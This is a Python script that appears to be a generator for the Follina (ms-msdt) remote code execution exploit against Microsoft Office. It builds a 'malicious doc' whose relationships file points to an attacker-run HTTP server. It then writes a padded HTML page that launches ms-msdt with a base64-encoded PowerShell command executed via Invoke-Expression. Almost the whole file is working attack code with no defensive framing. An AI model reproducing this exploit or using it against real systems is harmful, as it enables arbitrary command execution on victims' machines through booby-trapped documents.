import socket
from config import *
import http
import functools
import socketserver
import sys
import os
import shutil
import random
import Document
import tempfile
import base64
import string


def check_ip_port(ip, port):
    """Check if and IP and Port is available"""

    s = socket.socket()
    status = True
    try:
        s.bind((ip, port))
    except socket.error:
        # Return false in case there are any binding errors regardless of status
        status = False
    s.close()
    return status


def start_server(ip, port):
    """Serve SERVER_DIR over HTTP"""

    Handler = functools.partial(
        http.server.SimpleHTTPRequestHandler, directory=SERVER_DIR)
    httpd = socketserver.TCPServer((ip, port), Handler)
    print(":globe_with_meridians:",
          f"Serving [magenta]{SERVER_DIR}[/magenta] over http://{ip}:{port}")
    httpd.serve_forever()


def docx_to_rtf(name):
    f = open(name, 'rb')
    document = Document(f)
    document.save(f"{name}_rtf")
    f.close()


def prepare_malicious_doc(opt):
    """Prepare Malicious Doc"""

    # Check for skeleton file and move it to the staging directory
    print(":fire:", "Preparing Malicious doc")
    if not os.path.isdir("./doc"):
        print(
            ":x:", "[red]Could not find skeleton folder in current directory![/red]", file=sys.stderr)
        sys.exit(-3)
    shutil.copytree("doc", DOC_DIR)

    # Put URL in as a staging template
    rels_file = ""

    if not os.path.isfile(DOC_RELS_PATH):
        print(
            ':x:', f"[red]Could not find {DOC_RELS_PATH}[/red]", file=sys.stderr)
        sys.exit(-4)

    with open(DOC_RELS_PATH) as f:
        rels_file = f.read()

    rels_file = rels_file.replace(
        "{staged_html}", f"http://{opt['server_params'][0]}:{opt['server_params'][1]}/index.html")

    with open(DOC_RELS_PATH, "w") as f:
        f.write(rels_file)

    # Re-build the original files
    temp_fd, temp_file = tempfile.mkstemp(prefix="follina_", dir=TMP_DIR)
    shutil.make_archive(temp_file, "zip", DOC_DIR)
    os.rename(f"{temp_file}.zip", f"{TMP_DIR}/{opt['output']}")
    os.close(temp_fd)

    # Check if RTF Files needs to be generated
    if opt['rtf']:
        docx_to_rtf(f"{TMP_DIR}/{opt['output']}")
        shutil.copy(f"{TMP_DIR}/{opt['output']}_rtf",
                    f"{os.getcwd()}/{opt['output']}")
    else:
        shutil.copy(f"{TMP_DIR}/{opt['output']}",
                    f"{os.getcwd()}/{opt['output']}")

    print(":white_check_mark:",
          f"Created Malicios Doc: [red]{os.getcwd()}/{opt['output']}[/red]")


def prepare_payload_html(opts):
    payload = base64.b64encode(opts['cmd'].encode()).decode()
    html_payload = f"""window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\"";"""

    html_padding = f"<p>{''.join([random.choice(string.printable) for _ in range(4096)])}</p>"

    html_doc = f"""<!doctype html>
<html lang="en">
    <head>
        <title>You Have Been Follina'd</title>
    </head>
    <body>
        {html_padding}
    </body>
    <script>
        {html_payload}
    </script>
</html>
    """

    with open(f"{SERVER_DIR}/index.html", "w") as f:
        f.write(html_doc)

    print(":beetle:",
          f"Wrote payload to [magenta]{SERVER_DIR}/index.html[/magenta]")
